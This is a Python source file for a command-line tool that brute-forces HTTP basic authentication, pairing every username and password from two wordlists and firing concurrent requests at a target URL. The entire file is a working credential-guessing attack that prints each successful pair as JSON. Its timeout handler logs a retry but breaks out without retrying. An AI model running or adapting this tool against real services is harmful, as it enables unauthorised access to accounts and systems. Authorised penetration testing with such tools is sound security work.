from __future__ import annotations
import json
import sys
import asyncio
from typing import Any, Optional
from collections.abc import AsyncIterator, Callable, Coroutine
from pathlib import Path
from contextvars import ContextVar

import aiofiles
import attr
import httpx
import typer
from tqdm import tqdm

from brute import log
from brute.queue import Item, Queue, StopReason

async_client_var: ContextVar[httpx.AsyncClient] = ContextVar("async_client")
request_var: ContextVar[httpx.Request] = ContextVar("request")
pbar_var: ContextVar[tqdm] = ContextVar("pbar")
stop_on_found_var: ContextVar[bool] = ContextVar("stop_on_found")
results_var: ContextVar[Results] = ContextVar("results")


@attr.mutable(kw_only=True)
class Results:
    found_working_credentials: bool = attr.field(default=False)


@attr.frozen(kw_only=True)
class CredPair:
    username: str
    password: str

    def json_str(self) -> str:
        return json.dumps(attr.asdict(self))


@attr.frozen(kw_only=True)
class RequestItem(Item):
    cred_pair: CredPair

    async def process(
        self, enqueue: Callable[[Item], Coroutine[Any, Any, None]]
    ) -> Optional[StopReason]:
        request = request_var.get()
        client = async_client_var.get()
        pbar = pbar_var.get()
        stop_on_found = stop_on_found_var.get()
        results = results_var.get()

        success = False

        while True:
            try:
                pbar.set_postfix_str(
                    (
                        f"username={self.cred_pair.username[:10]: <10}, "
                        f"password={self.cred_pair.password[:10]: <10}"
                    ),
                    refresh=False,
                )
                pbar.update()
                response = await client.send(
                    request, auth=(self.cred_pair.username, self.cred_pair.password)
                )
                success = response.status_code < 400
            except httpx.ReadTimeout:
                # just log and try again? maybe do some kind of congestion control later
                log.warn(
                    f"Retrying because read timeout for request {request} and {self.cred_pair}"
                )
            break

        if success:
            results.found_working_credentials = True
            log.info("Found working credentials 😀")
            pbar.write(
                self.cred_pair.json_str(),
                file=sys.stdout,
            )
            if stop_on_found:
                return StopReason(reason="Stopping because working credentials have been found.")

        return None


async def iterlines(path: Path) -> AsyncIterator[str]:
    """
    Yield non-empty lines (stripped of newline char) from a file
    """
    try:
        async with aiofiles.open(path) as f:
            async for line in f:
                if len(line) >= 2:  # we know there's a \n and some data
                    yield line[:-1]
    except FileNotFoundError:
        raise ValueError(f"Path {path} is not a readable file")


@attr.frozen(kw_only=True)
class CredentialLoaderItem(Item):
    username_path: Path
    password_path: Path

    async def process(
        self, enqueue: Callable[[Item], Coroutine[Any, Any, None]]
    ) -> None:
        async for username in iterlines(self.username_path):
            async for password in iterlines(self.password_path):
                cred_pair = CredPair(username=username, password=password)
                await enqueue(RequestItem(cred_pair=cred_pair))


async def lines_in_file(path: Path) -> int:
    count = 0
    async with aiofiles.open(path) as f:
        async for _ in f:
            count += 1
    return count


@attr.frozen(kw_only=True)
class CredentialCounterItem(Item):
    username_path: Path
    password_path: Path

    async def process(
        self, enqueue: Callable[[Item], Coroutine[Any, Any, None]]
    ) -> None:
        pbar = pbar_var.get()

        username_count = await lines_in_file(self.username_path)
        password_count = await lines_in_file(self.password_path)

        pbar.total = username_count * password_count

        log.debug("Total credential pairs counted, progress bar now displaying.")


async def start_queue(
    url: str,
    username_path: Path,
    password_path: Path,
    queue_maxsize: int,
    consumer_count: int,
    stop_on_found: bool,
) -> bool:
    """
    Start tasks that read from the username and password paths and run GET requests
    to try them out.
    """
    log.info(
        f"Brute forcing basic auth on {url} with usernames from {username_path} and "
        f"passwords from {password_path}"
    )

    # queue: asyncio.Queue[CredPair] = asyncio.Queue(maxsize=queue_maxsize)
    pbar = tqdm(unit=" requests", leave=False)
    pbar_var.set(pbar)

    stop_on_found_var.set(stop_on_found)

    results = Results()
    results_var.set(results)

    async with httpx.AsyncClient() as client:
        async_client_var.set(client)

        request = client.build_request("GET", url)
        request_var.set(request)

        queue = Queue.create(
            queue_maxsize=queue_maxsize,
            stop_reason_callback=lambda sr: log.info(str(sr)),
        )

        await queue.complete(
            initial_items=[
                CredentialLoaderItem(
                    username_path=username_path,
                    password_path=password_path,
                ),
                CredentialCounterItem(
                    username_path=username_path,
                    password_path=password_path,
                ),
            ],
            worker_count=consumer_count,
        )

    pbar.close()

    if not results.found_working_credentials:
        log.info("Could not find working credentials 😢")
        return False

    return True


def main(
    url: str,
    username_path: Path,
    password_path: Path,
    queue_maxsize: int = typer.Option(
        default=10_000,
        help=(
            "Maximum username/password pairs to keep in memory. Setting too low will "
            "reduce performance, while too high might fill up all your RAM."
        ),
    ),
    requestor_count: int = typer.Option(
        default=3,
        help=(
            "Number of concurrent requestors to run asynchronously. Setting too low "
            "will reduce performance, while too high will cause requestor starvation."
        ),
    ),
    stop_on_found: bool = typer.Option(
        default=True, help="Stop after finding the first working credential."
    ),
    asyncio_debug: bool = typer.Option(
        default=False,
        help="Turn on asyncio debugging.",
    ),
) -> int:
    """
    Make http requests against URL that has basic authentication. The usernames and
    passwords provided are the cartesian product of the lines in files at USERNAME_PATH
    and PASSWORD_PATH.

    Credential pairs that yield responses with status codes < 400 are considered working
    and will be printed to stdout as JSON documents, one per line.

    Returns with an exit code of 0 if a working credential pair was found and 1 if not.
    """
    found = asyncio.run(
        start_queue(
            url=url,
            username_path=username_path,
            password_path=password_path,
            queue_maxsize=queue_maxsize,
            consumer_count=requestor_count,
            stop_on_found=stop_on_found,
        ),
        debug=asyncio_debug,
    )

    raise typer.Exit(0 if found else 1)


if __name__ == "__main__":
    typer.run(main)
